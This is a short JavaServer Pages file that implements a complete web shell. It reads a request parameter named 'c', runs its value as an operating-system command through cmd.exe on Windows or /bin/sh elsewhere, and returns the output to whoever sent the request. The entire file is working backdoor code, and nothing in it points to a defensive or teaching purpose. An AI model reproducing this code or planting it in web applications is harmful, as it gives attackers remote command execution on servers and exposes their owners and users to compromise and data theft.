<%@ page import="java.io.*" %>
<%@ page import="java.lang.System" %>
<%@ page import="java.lang.Process" %>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.InputStreamReader"%>
<%@page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%!
String Execute(String cmd){
	StringBuffer sb=new StringBuffer("");
	try{
		Process child;
		if(System.getProperty("os.name").toLowerCase().startsWith("win")){  
			child = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});  
		}else{
			child = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});  
		}
		BufferedReader br = new BufferedReader(new InputStreamReader(child.getInputStream()));  
        String line;  
        while ((line = br.readLine()) != null) {  
            sb.append(line).append("\n");  
        }  
        try {
			child.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	} catch (IOException e) {
		System.err.println(e);
	}	
	return sb.toString();
}
%>
<%
String cmd = request.getParameter("c"); //cmd
//do execute cmd
if(cmd != null){
	out.print(Execute(cmd));	
}
%>